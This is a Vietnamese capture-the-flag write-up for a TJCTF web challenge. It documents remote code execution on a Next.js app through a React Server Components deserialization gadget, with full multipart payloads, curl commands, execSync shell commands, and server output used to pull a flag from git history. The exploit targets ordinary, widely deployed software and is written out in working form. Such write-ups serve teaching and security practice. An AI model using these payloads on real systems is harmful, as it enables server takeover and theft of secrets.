# TJCTF react2shell



## Writeup

Mục tiêu: lấy real flag từ chall `https://vibecoded-0d1732a519293ed9.tjc.tf/`.

### Ý chính

* App chạy Next.js
* Có gadget RCE qua Server Actions / RSC deserialization
* `/flag.txt` và `process.env.FLAG` là fake
* Real flag nằm trong git history của repo deploy sẵn ở `/app/.git`

***

## 1. Recon trang chủ

`GET /` trả HTML kiểu Next.js, có marker server action:

```html
<input type="hidden" name="$ACTION_ID_40cecd84ea8f6a2e4fc21505453351fd6313e28428"/>
<input type="hidden" name="$ACTION_ID_40ed6c0b53c7f99c3fa4946ff1d02a94a11906dcc9"/>
```

Header:

```http
HTTP/2 200
x-powered-by: Next.js
```

\=> đủ dấu hiệu app dùng Server Actions / RSC.

***

## 2. Primitive RCE

Payload dùng chain này:

```json
{
  "then": "$1:__proto__:then",
  "_formData": {
    "get": "$1:constructor:constructor"
  }
}
```

### Ý nghĩa

* ép server lấy `constructor.constructor`
* tức `Function(...)`
* nội dung JS nhét vào `_prefix`
* exfil qua:

```js
throw Object.assign(new Error('NEXT_REDIRECT'), { digest: ... })
```

Body multipart phải dùng CRLF, nếu không request dễ fail.

### File body mẫu

```bash
python3 - <<'PY'
body = """------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"0\"\r
\r
{\r
  \"then\": \"$1:__proto__:then\",\r
  \"status\": \"resolved_model\",\r
  \"reason\": -1,\r
  \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",\r
  \"_response\": {\r
    \"_prefix\": \"throw Object.assign(new Error('NEXT_REDIRECT'),{digest:process.cwd()});\",\r
    \"_chunks\": \"$Q2\",\r
    \"_formData\": {\r
      \"get\": \"$1:constructor:constructor\"\r
    }\r
  }\r
}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"1\"\r
\r
\"$@0\"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"2\"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"""
open('/tmp/yap_body.txt', 'wb').write(body.encode())
PY
```

### Bắn request

```bash
curl --path-as-is -sk -X POST \
  -H 'Next-Action: x' \
  -H 'X-Nextjs-Request-Id: b5dce965' \
  -H 'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
  --data-binary @/tmp/yap_body.txt \
  'https://vibecoded-0d1732a519293ed9.tjc.tf/'
```

Output:

```txt
0:{"a":"$@1","f":"","b":"5VGptBeLn4iPBWXBhhT5c"}
1:E{"digest":"/app"}
```

\=> xác nhận code chạy trên server, cwd là `/app`.

***

## 3. Enumerate nhanh

Đổi `_prefix` để lấy info khác.

### id

```js
var cp=process.mainModule.require('child_process');
throw Object.assign(new Error('NEXT_REDIRECT'),{
  digest:cp.execSync('id').toString().trim()
});
```

Output:

```txt
uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)
```

### List /

```txt
app,bin,dev,etc,flag.txt,home,lib,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var
```

### List /app

```txt
.git,.next,node_modules,package.json,server.js
```

Điểm quan trọng: production image chứa `.git`.

***

## 4. Kiểm tra fake flag

### Đọc env

```txt
NODE_VERSION=20.20.2|HOME=/home/nextjs|PWD=/app|NODE_ENV=production|FLAG=tjctf{lmao_lock_in_stop_finding_f4k3s}|...
```

### Đọc /flag.txt

```txt
tjctf{lmao_lock_in_stop_finding_f4k3s}
```

\=> cả env và `/flag.txt` đều trả cùng fake flag.

Lúc này route tốt nhất:

* đừng đào `/root`, `/tmp`, reverse shell
* nhìn `.git` rồi đọc git history

***

## 5. Đào git history

### Payload đọc log

```js
var cp=process.mainModule.require('child_process');
throw Object.assign(new Error('NEXT_REDIRECT'),{
  digest:cp.execSync('cd /app && git log --oneline --decorate -n 15').toString()
});
```

Output:

```txt
8e522db (HEAD -> master) remove sensitive config
0692a5a initial commit
```

Commit message `remove sensitive config` rất đáng ngờ.

### Đọc diff commit đó

```js
var cp=process.mainModule.require('child_process');
throw Object.assign(new Error('NEXT_REDIRECT'),{
  digest:cp.execSync('cd /app && git show --format=medium --unified=3 8e522db').toString()
});
```

Output quan trọng:

```diff
commit 8e522db0209846f1941e9d675bdc12c9d36272d1
Author: yap-dev <dev@yapapp.com>
Date:   Fri May 15 10:57:21 2026 +0000

    remove sensitive config

diff --git a/.env b/.env
deleted file mode 100644
index 958d9d6..0000000
--- a/.env
+++ /dev/null
@@ -1 +0,0 @@
-FLAG=tjctf{th1s_1s_Y_w3_d0nt_vibeeee_codeeee_sv3lte_ov3r_r34ct_any_d4y_r34ct_s3rv3r_c0mp0n3nts_CVE-2025-55182}
```

\=> real flag nằm trong `.env` của commit cũ, sau đó bị xóa khỏi HEAD.

***

## 6. Payload cuối lấy flag trực tiếp

Có thể đọc thẳng `.env` ở commit trước bằng:

```bash
git show HEAD^:.env
```

### Body hoàn chỉnh

```bash
python3 - <<'PY'
body = """------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"0\"\r
\r
{\r
  \"then\": \"$1:__proto__:then\",\r
  \"status\": \"resolved_model\",\r
  \"reason\": -1,\r
  \"value\": \"{\\\"then\\\":\\\"$B1337\\\"}\",\r
  \"_response\": {\r
    \"_prefix\": \"var cp=process.mainModule.require('child_process');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:cp.execSync('cd /app && git show HEAD^:.env | cut -d= -f2-').toString().trim()});\",\r
    \"_chunks\": \"$Q2\",\r
    \"_formData\": {\r
      \"get\": \"$1:constructor:constructor\"\r
    }\r
  }\r
}\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"1\"\r
\r
\"$@0\"\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r
Content-Disposition: form-data; name=\"2\"\r
\r
[]\r
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"""
open('/tmp/yap_body_crlf.txt', 'wb').write(body.encode())
PY
```

### Trigger

```bash
curl --path-as-is -sk -X POST \
  -H 'Next-Action: x' \
  -H 'X-Nextjs-Request-Id: b5dce965' \
  -H 'X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad' \
  --data-binary @/tmp/yap_body_crlf.txt \
  'https://vibecoded-0d1732a519293ed9.tjc.tf/'
```

Output:

```txt
0:{"a":"$@1","f":"","b":"5VGptBeLn4iPBWXBhhT5c"}
1:E{"digest":"tjctf{th1s_1s_Y_w3_d0nt_vibeeee_codeeee_sv3lte_ov3r_r34ct_any_d4y_r34ct_s3rv3r_c0mp0n3nts_CVE-2025-55182}"}
```

Flag:

```txt
tjctf{th1s_1s_Y_w3_d0nt_vibeeee_codeeee_sv3lte_ov3r_r34ct_any_d4y_r34ct_s3rv3r_c0mp0n3nts_CVE-2025-55182}
```

***

## Tóm tắt tư duy

1. Xác nhận Next.js + Server Actions
2. Dùng deserialization gadget để chạy JS
3. Enumerate tối thiểu
4. Phát hiện `.git` trong `/app`
5. Bỏ qua fake flag
6. Đào commit history
7. Lấy `.env` từ commit cũ
